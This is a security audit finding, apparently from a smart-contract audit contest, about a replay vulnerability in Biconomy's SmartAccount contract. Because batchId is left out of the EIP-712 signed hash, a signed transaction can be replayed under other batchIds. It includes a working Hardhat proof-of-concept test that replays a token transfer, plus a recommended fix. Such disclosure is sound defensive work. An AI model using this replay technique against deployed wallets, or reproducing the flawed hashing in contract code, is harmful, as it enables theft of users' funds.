[H-07] Replay attack (EIP712 signed transaction)
Submitted byTointer, also found byV_B,Tricko,Haipls,Koolex,peakbolt,0xdeadbeef0x,PwnedNoMore,romand,ro,csanuragjain,HE1M,taek, andorion
contracts/smart-contract-wallet/SmartAccount.sol#L212
Signed transaction can be replayed. First user transaction can always be replayed any amount of times. With non-first transactions attack surface is reduced but never disappears.
Why it is possible
Contract checksnonces[batchId]but notbatchIditself, so we could reuse other batches nounces. If before transaction we havenbatches with the same nonce as transaction batch, then transaction can be replayedntimes. Since there are 2^256batchIds with nonce = 0, first transaction in any batch can be replayed as much times as attacker needs.
Proof of Concept
Insert this test intestGroup1.tsright afterShould set the correct states on proxytest:
it("replay EIP712 sign transaction", async function () {await token.connect(accounts[0]).transfer(userSCW.address, ethers.utils.parseEther("100"));const safeTx: SafeTransaction = buildSafeTransaction({to: token.address,data: encodeTransfer(charlie, ethers.utils.parseEther("10").toString()),nonce: await userSCW.getNonce(0),});const chainId = await userSCW.getChainId();const { signer, data } = await safeSignTypedData(accounts[0],userSCW,safeTx,chainId);const transaction: Transaction = {to: safeTx.to,value: safeTx.value,data: safeTx.data,operation: safeTx.operation,targetTxGas: safeTx.targetTxGas,};const refundInfo: FeeRefund = {baseGas: safeTx.baseGas,gasPrice: safeTx.gasPrice,tokenGasPriceFactor: safeTx.tokenGasPriceFactor,gasToken: safeTx.gasToken,refundReceiver: safeTx.refundReceiver,};let signature = "0x";signature += data.slice(2);await expect(userSCW.connect(accounts[2]).execTransaction(transaction,0, // batchIdrefundInfo,signature)).to.emit(userSCW, "ExecutionSuccess");//contract checks nonces[batchId] but not batchId itself//so we can change batchId to the one that have the same nonce//this would replay transactionawait expect(userSCW.connect(accounts[2]).execTransaction(transaction,1, // changed batchIdrefundInfo,signature)).to.emit(userSCW, "ExecutionSuccess");//charlie would have 20 tokens after thisexpect(await token.balanceOf(charlie)).to.equal(ethers.utils.parseEther("20"));});
Recommended Mitigation Steps
AddbatchIdto the hash calculation of the transaction inencodeTransactionDatafunction.
livingrockrises (Biconomy) confirmed